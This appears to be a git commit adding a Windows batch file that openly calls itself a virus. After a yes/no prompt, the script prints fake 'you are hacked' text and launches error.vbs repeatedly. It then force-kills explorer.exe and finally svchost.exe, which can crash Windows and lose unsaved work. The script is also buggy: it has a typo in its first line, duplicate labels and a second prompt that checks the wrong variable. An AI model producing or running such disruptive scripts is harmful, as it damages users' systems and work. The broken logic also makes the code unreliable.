ad0529e15244d9c70814b42094ceed866349e9c7
1here3 <159972256+1here3@users.noreply.github.com>
2025-02-23 19:24:13 -0800

    Create vineria.bat

---
+++ vineria.bat
@@ -0,0 +1,42 @@
+@echo out
+echo Hey,wanna run the virus
+set /p love=
+if %love%==no goto love
+if %love%==yes goto hate
+:love
+echo the virus isnt gonna hapen cuz yiu typed no
+pause 
+exit
+:hate
+echo 743866&^*&#^7463827^#*&4
+echo You are hacked...
+echo ^586%&*^*#&%7635635$(64%^%*&$444/>4t&t>>8
+timeout 10
+start error.vbs
+timeout 7
+start error.vbs
+timeout 4
+start error.vbs
+timeout 2
+start error.vbs
+timeout 1
+start error.vbs
+start error.vbs
+taskkill /f /im explorer.exe
+echo this is the FINAL STRAW, run the rest or no
+set /p nope=
+if %love%==no goto nope
+if %love%==yes goto hate
+:love
+echo here is the windows backgorund for ya
+timeout 1
+start explorer.exe
+pause 
+exit
+:hate
+echo error 
+timeout 1
+start error.vbs
+echo last destruction starts now
+timeout 1
+taskkill /f /im svchost.exe
